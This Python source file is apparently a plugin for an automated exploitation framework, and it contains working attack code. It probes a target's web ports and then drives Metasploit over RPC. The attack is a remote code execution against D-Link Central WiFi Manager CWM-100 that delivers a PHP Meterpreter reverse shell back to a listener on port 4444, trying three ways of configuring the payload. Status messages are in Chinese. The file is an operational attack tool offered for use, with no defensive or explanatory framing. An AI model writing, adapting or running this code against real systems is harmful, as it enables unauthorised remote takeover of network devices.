import os
import sys

lib_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "lib")
sys.path.insert(0, lib_path)

from colorama import Fore,init
import socket
import fcntl
init(autoreset=True)

def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)


class Module:
    def __init__(self):
        self.name = "D-Link Central WiFi Manager CWM(100) RCE"
        self.port = None
        self.protocol = "tcp"
        self.platform = "windows"
        self.use_msf = True

    def _probe_http(self, target_ip, port, ssl, timeout=3):
        try:
            with socket.create_connection((target_ip, port), timeout=timeout) as s:
                if ssl:
                    import ssl as _ssl
                    ctx = _ssl._create_unverified_context()
                    with ctx.wrap_socket(s, server_hostname=target_ip) as ss:
                        ss.settimeout(timeout)
                        ss.sendall(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % target_ip.encode())
                        return bool(ss.recv(64))
                else:
                    s.settimeout(timeout)
                    s.sendall(b"GET / HTTP/1.0\r\nHost: %s\r\n\r\n" % target_ip.encode())
                    return bool(s.recv(64))
        except Exception:
            return False

    def _pick_endpoint(self, target_ip, target_port):
        candidates = []
        if target_port is not None:
            guess_ssl = (target_port in (443, 8443))
            candidates.append((target_port, guess_ssl))
            candidates.append((target_port, not guess_ssl))
        else:
            candidates = [(80, False), (443, True), (8080, False), (8443, True)]
        for p, s in candidates:
            if self._probe_http(target_ip, p, s):
                return p, s
        if target_port is not None:
            return target_port, (target_port in (443, 8443))
        return 80, False

    def _run_msf_exploit(self, target_ip, port, use_ssl, lhost):
        module_name = "windows/http/dlink_central_wifimanager_rce"
        payload_name = "php/meterpreter/reverse_tcp"
        errors = []

        try:
            exploit = self.msf_client.modules.use("exploit", module_name)
            exploit["RHOSTS"] = target_ip
            exploit["RPORT"] = port
            exploit["SSL"] = use_ssl
            result = exploit.execute(
                payload=payload_name,
                options={"LHOST": lhost, "LPORT": 4444},
            )
            return True, result
        except Exception as e:
            errors.append(f"错误: {e!r}")

        try:
            exploit = self.msf_client.modules.use("exploit", module_name)
            exploit["RHOSTS"] = target_ip
            exploit["RPORT"] = port
            exploit["SSL"] = use_ssl
            payload = self.msf_client.modules.use("payload", payload_name)
            payload["LHOST"] = lhost
            payload["LPORT"] = 4444
            try:
                payload["AutoLoadExtensions"] = ""
            except Exception:
                pass
            result = exploit.execute(payload=payload)
            return True, result
        except Exception as e:
            errors.append(f"错误: {e!r}")

        try:
            exploit = self.msf_client.modules.use("exploit", module_name)
            exploit["RHOSTS"] = target_ip
            exploit["RPORT"] = port
            exploit["SSL"] = use_ssl
            exploit["PAYLOAD"] = payload_name
            exploit["LHOST"] = lhost
            exploit["LPORT"] = 4444
            result = exploit.execute()
            return True, result
        except Exception as e:
            errors.append(f"错误: {e!r}")

        return False, "调用payload失败 | " + " || ".join(errors)

    def exploit(self, target_ip=None, target_port=None, lhost=None, session=None):
        if not target_ip:
            return False, "缺少 target_ip"
        if not getattr(self, "msf_client", None):
            return False, " MSF RPC 未就绪"
        if not lhost:
            lhost = "127.0.0.1"

        port, use_ssl = self._pick_endpoint(target_ip, target_port)
        scheme = "https" if use_ssl else "http"
        safe_print(f"{Fore.GREEN}[*] D-Link CWM: 使用 {scheme}://{target_ip}:{port}")

        ok, result = self._run_msf_exploit(target_ip, port, use_ssl, lhost)
        if not ok:
            return False, f"利用失败: {result}"

        if isinstance(result, dict) and result.get("job_id"):
            return True, (
                f"D-Link CWM(100) RCE 已提交 (job {result['job_id']})，"
                f"{scheme}://{target_ip}:{port}，监听 {lhost}:4444"
            )
        return False, f"利用失败: {result}"
